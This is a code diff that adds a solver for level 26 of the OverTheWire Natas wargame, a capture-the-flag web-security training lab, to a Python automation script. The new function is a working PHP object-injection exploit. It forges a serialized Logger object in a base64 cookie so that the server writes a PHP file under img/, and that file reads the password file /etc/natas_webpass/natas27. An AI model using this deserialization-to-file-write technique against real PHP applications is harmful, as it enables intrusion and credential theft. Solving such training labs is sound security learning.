@@ -1,6 +1,7 @@
 import http.client
 import urllib.parse
-import string, re, base64, json, time
+import string, re, base64, json
+import random, time
 
 host = "natas.labs.overthewire.org"
 login = "natas"
@@ -592,6 +593,42 @@ def level25():
     else:
         print(" Password not found")
 
+def level26():
+    s = "img/s{}.php".format(random.randint(1000, 9999))
+    p = "<? echo(file_get_contents(\"/etc/natas_webpass/natas27\")); ?>"
+    d = "O:6:\"Logger\":3:{{s:15:\"{n}Logger{n}logFile\";s:{}:\"{}\";s:15:\"{n}Logger{n}initMsg\";s:0:\"\";s:15:\"{n}Logger{n}exitMsg\";s:{}:\"{}\";}}".format(len(s), s, len(p), p, n=chr(0))
+    res, reg = rex(
+        "GET",
+        "/",
+        "",
+    )
+
+    if res.status != 200: return
+    c = res.getheader("Set-Cookie")
+    print(" Got cookie {}".format(c))
+    print(" Cookie injection serialized PHP data {}".format(d))
+    res, reg = rex(
+        "GET",
+        "/",
+        "",
+        headers={"Cookie": "{}; drawing={}".format(c, base64.b64encode(d.encode()).decode())},
+    )
+
+    if res.status != 200: return
+    print(" Get page {}".format(s))
+    res, reg = rex(
+        "GET",
+        "/{}".format(s),
+        "(\w+)",
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -603,7 +640,7 @@ levels = [
     level12, level12, level14, level15,
     level16, level17, level18, level18,
     level20, level21, level22, level23,
-    level24, level25, levelN, levelN,
+    level24, level25, level26, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN,
 ]
